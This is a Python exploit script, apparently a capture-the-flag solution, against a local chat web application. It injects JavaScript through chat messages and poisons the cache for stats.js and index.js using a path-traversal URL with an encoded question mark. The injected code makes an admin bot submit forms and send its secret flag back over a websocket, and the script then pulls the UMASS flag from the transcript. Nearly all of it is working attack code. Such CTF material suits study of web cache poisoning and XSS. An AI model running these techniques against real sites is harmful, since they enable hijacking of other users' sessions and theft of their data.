import requests as r
from websocket import create_connection
import time
import random
import string
import re

remote = "localhost"
port = 80
url_base = f"http://{remote}:{port}"

s = r.Session();
username = "".join(random.choice(string.ascii_lowercase) for i in range(20))
resp = s.post(f"{url_base}/register", data={"username": username})
print(resp)
key = s.post(f"{url_base}/chatkey").text
print(key)
s.post(f"{url_base}/clearchat")
ws = create_connection(f"ws://{remote}:{port}/chat")
ws.send(key)
result = ws.recv()
ws.send("*/")

time.sleep(16)


print("setting up poison for stats.js")
ws.send("""= [2]; 
        document.addEventListener("DOMContentLoaded", 
        function(event){
          const form = document.getElementsByTagName('form')[0];
          form.setAttribute("action", "/report/admin");
          form.submit();
        });/*""")

time.sleep(1)
print("poisoning cache")
reprep = r.Request(method='GET', url=f"{url_base}/static/../transcript%253f/../cache/stats.js")
prep = reprep.prepare()
prep.url = f"{url_base}/static/../transcript%3f/../cache/stats.js"
s.send(prep)

time.sleep(1)
print("setting up poison for index.js")
ws.send(
"""=[4];let queryString = window.location.search;
const urlParams = new URLSearchParams(queryString);
const result = urlParams.get('result');
let flag;
if(result){
  flag = decodeURI(result);
}
const initChat = async function(){
  const key = await (await fetch("/chatkey", {method:"post", credentials:'include'})).text();
  ws = new WebSocket("/chat");
  ws.onopen = function(event){
    ws.send(key);
  };
  ws.onmessage = function(event){
    if(event.data === "successfully authorized"){
      ws.send(flag)
    }
  };
};

initChat();/*"""
)

time.sleep(1)
print("poisoning cache")
reprep = r.Request(method='GET', url=f"{url_base}/static/../transcript%253f/../cache/index.js")
prep = reprep.prepare()
prep.url = f"{url_base}/static/../transcript%3f/../cache/index.js"
s.send(prep)


print("reporting")
s.post(f"{url_base}/report/{username}")

time.sleep(5)
resp = s.get(f"{url_base}/transcript").text
print(resp)
reg = re.search(r'(UMASS{.*?})',resp).group()
print(reg)
